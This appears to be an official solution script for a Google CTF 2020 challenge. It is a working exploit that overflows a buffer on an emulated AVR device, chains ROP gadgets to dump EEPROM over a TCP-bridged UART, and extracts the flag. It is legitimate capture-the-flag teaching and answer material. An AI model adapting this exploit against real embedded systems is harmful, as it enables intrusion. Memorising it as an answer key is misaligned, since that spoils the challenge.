#!/usr/bin/env python3
#Copyright 2020 Google LLC
#
#Licensed under the Apache License, Version 2.0 (the "License");
#you may not use this file except in compliance with the License.
#You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS,
#    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#    See the License for the specific language governing permissions and
#    limitations under the License.

import re
import sys
import struct
import asyncio

TARGET_IP = None
TARGET_PORT = 1337


def proto2str(resp):
  res = re.sub('@W([a-fA-F0-9]+)', lambda m: chr(int(m.group(1), 16)), resp)
  return res


async def solution_client():
  global TARGET_IP

  use_usart_isr = True

  if use_usart_isr:
    # 0x00000220 <+38>:	in	r0, 0x3f	; 63
    # 0x00000222 <+40>:	cli
    # 0x00000224 <+42>:	out	0x3e, r29	; 62
    # 0x00000226 <+44>:	out	0x3f, r0	; 63
    # 0x00000228 <+46>:	out	0x3d, r28	; 61
    # 0x0000022a <+48>:	pop	r29
    # 0x0000022c <+50>:	pop	r28
    # 0x0000022e <+52>:	ret
    read_cmd_rop = b'\x00' + struct.pack('>H', 0x222 >> 1)

    dump_eeprom_sym = struct.pack('<H', 0x230 >> 1)

    # 0x0000052e <+114>:	brne	.+60     	;  0x56c <menu_loop+176>
    # 0x00000530 <+116>:	ldi	r24, 0xA8	; 168
    # 0x00000532 <+118>:	ldi	r25, 0x03	; 3
    # 0x00000534 <+120>:	rcall	.+548    	;  0x75a <puts>
    # 0x00000536 <+122>:	movw	r24, r14
    # 0x00000538 <+124>:	rcall	.-832    	;  0x1fa <read_cmd>
    magic_num_rop = b'\x00' + struct.pack('>H', 0x530 >> 1)

    # 0x000005c4 <+46>:	rcall	.-266    	;  0x4bc <menu_loop>
    # 0x000005c6 <+48>:	cli
    main_ret = b'\x00' + struct.pack('>H', 0x5c6 >> 1)
  else:
    # 0x000001dc <+38>:	in	r0, 0x3f	; 63
    # 0x000001de <+40>:	cli
    # 0x000001e0 <+42>:	out	0x3e, r29	; 62
    # 0x000001e2 <+44>:	out	0x3f, r0	; 63
    # 0x000001e4 <+46>:	out	0x3d, r28	; 61
    # 0x000001e6 <+48>:	pop	r29
    # 0x000001e8 <+50>:	pop	r28
    # 0x000001ea <+52>:	ret
    read_cmd_rop = b'\x00' + struct.pack('>H', 0x1de >> 1)

    dump_eeprom_sym = struct.pack('<H', 0x1ec >> 1)

    # 0x000004ea <+114>:	brne	.+60     	;  0x528 <menu_loop+176>
    # 0x000004ec <+116>:	ldi	r24, 0xA8	; 168
    # 0x000004ee <+118>:	ldi	r25, 0x03	; 3
    # 0x000004f0 <+120>:	rcall	.+548    	;  0x716 <puts>
    # 0x000004f2 <+122>:	movw	r24, r14
    # 0x000004f4 <+124>:	rcall	.-832    	;  0x1b6 <read_cmd>
    magic_num_rop = b'\x00' + struct.pack('>H', 0x4ec >> 1)

    # 0x00000580 <+46>:	rcall	.-266    	;  0x478 <menu_loop>
    # 0x00000582 <+48>:	cli
    main_ret = b'\x00' + struct.pack('>H', 0x582 >> 1)

  stack_p = 0x1df0
  new_stack = b'\x00' + struct.pack('>H', stack_p)
  magic_func_pointers_on_stack = b'\x00' + struct.pack('>H', stack_p + 0x6)

  payload = b'AAAAA' + new_stack + read_cmd_rop + b'AAAAAAA'
  # New stack:
  payload += magic_func_pointers_on_stack + magic_num_rop + b'\x00' + dump_eeprom_sym + dump_eeprom_sym + b'BBBBBBB' + main_ret + b'\n0\n1\n0\n'

  payload_b = b''.join([b'@W%02X' % b for b in payload])

  if not TARGET_IP and len(sys.argv) != 2:
    print('No TARGET_IP has been specified!')
    sys.exit(1)
  elif len(sys.argv) == 2:
    TARGET_IP = sys.argv[1]

  reader, writer = await asyncio.open_connection(TARGET_IP, TARGET_PORT)

  debugger = False

  mode = await reader.read(2)
  if mode != b'&M':
    print('Handshake failed {}'.format(mode))
    return

  if debugger:
    writer.write(b'&D')
    await writer.drain()
    writer.write(b'*C')
  else:
    # Set Challenge mode
    writer.write(b'&C')
  await writer.drain()

  uart_str = ''
  while payload:
    resp = str(await reader.read(1024), 'utf-8')
    if not resp:
      break
    if '!' in resp:
      print('EXC: {}'.format(resp))
      break

    uart_str += proto2str(resp)
    sys.stdout.write(proto2str(resp))
    if '(do not enter more than 5 chars): ' in uart_str:
      # Push next letter from the buffer
      sys.stdout.write('AAA...\n')
      writer.write(payload_b)
      await writer.drain()
      payload = []
    sys.stdout.flush()

  uart_resp = ''
  while True:
    resp = str(await reader.read(1024), 'utf-8')
    if not resp:
      break

    decoded = proto2str(resp)
    uart_resp += decoded
    sys.stdout.write(decoded)
    sys.stdout.flush()
  print()

  found_eeprom = False
  data = ''
  for line in uart_resp.splitlines():
    if 'EEPROM dump' in line:
      found_eeprom = True
    elif 'Menu:' in line:
      found_eeprom = False
    elif found_eeprom:
      data += line[59:]

  m = re.match('^(CTF{.[^}]+})', data)
  if m:
    print(m.group(1))

  writer.close()
  await writer.wait_closed()

asyncio.run(solution_client())
